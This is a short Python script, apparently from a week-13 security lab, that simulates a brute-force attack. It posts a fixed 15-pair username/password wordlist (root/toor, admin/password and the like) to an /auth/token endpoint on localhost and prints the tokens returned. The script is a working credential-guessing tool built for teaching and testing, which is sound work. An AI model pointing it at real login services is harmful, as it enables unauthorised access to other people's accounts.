#!/usr/bin/env python3
"""
Brute Force Attack Simulation — Transport-Layer (Week 13)
==========================================================
Sends POST /auth/token requests cycling through a wordlist
of username/password pairs. Exactly 3 succeed.

Does NOT require sudo.

Usage:
  python3 attack_scripts/brute_force.py
"""

import argparse
import time
import requests


# Wordlist: 15 pairs, exactly 3 valid (alice, bob, admin)
WORDLIST = [
    ("alice", "password123"),       # ✓ Valid
    ("alice", "wrongpass"),
    ("bob", "securepass"),          # ✓ Valid
    ("bob", "password123"),
    ("admin", "adminpass"),         # ✓ Valid
    ("admin", "admin123"),
    ("root", "toor"),
    ("user", "password"),
    ("test", "test123"),
    ("guest", "guest"),
    ("admin", "password"),
    ("alice", "alice123"),
    ("charlie", "charlie1"),
    ("dave", "letmein"),
    ("eve", "trustno1"),
]


def main():
    parser = argparse.ArgumentParser(description="Brute Force Attack Simulation")
    parser.add_argument("--target-url", default="http://localhost:9080",
                        help="Target base URL (default: http://localhost:9080)")
    parser.add_argument("--delay", type=float, default=0.1,
                        help="Delay between attempts in seconds (default: 0.1)")
    args = parser.parse_args()

    token_url = f"{args.target_url}/auth/token"

    print(f"╔══════════════════════════════════════════╗")
    print(f"║     Brute Force Attack Simulation        ║")
    print(f"╠══════════════════════════════════════════╣")
    print(f"║  Target: {token_url}")
    print(f"║  Wordlist: {len(WORDLIST)} credential pairs")
    print(f"║  Delay: {args.delay}s between attempts")
    print(f"╚══════════════════════════════════════════╝")
    print()

    successes = 0
    failures = 0

    for i, (username, password) in enumerate(WORDLIST, 1):
        try:
            resp = requests.post(
                token_url,
                json={"username": username, "password": password},
                headers={"Content-Type": "application/json"},
                timeout=5,
            )

            if resp.status_code == 200:
                token = resp.json().get("token", "")
                token_preview = token[:30] + "..." if len(token) > 30 else token
                print(f"  [{i:2d}/{len(WORDLIST)}] [SUCCESS] {username}:{password} → Token: {token_preview}")
                successes += 1
            else:
                print(f"  [{i:2d}/{len(WORDLIST)}] [FAIL]    {username}:{password} → HTTP {resp.status_code}")
                failures += 1

        except requests.RequestException as e:
            print(f"  [{i:2d}/{len(WORDLIST)}] [ERROR]   {username}:{password} → {e}")
            failures += 1

        time.sleep(args.delay)

    print()
    print(f"═══════════════════════════════════════════")
    print(f"  Brute force complete.")
    print(f"  Valid credentials found: {successes}")
    print(f"  Failed attempts:         {failures}")
    print(f"  Total attempts:          {len(WORDLIST)}")
    print(f"═══════════════════════════════════════════")


if __name__ == "__main__":
    main()
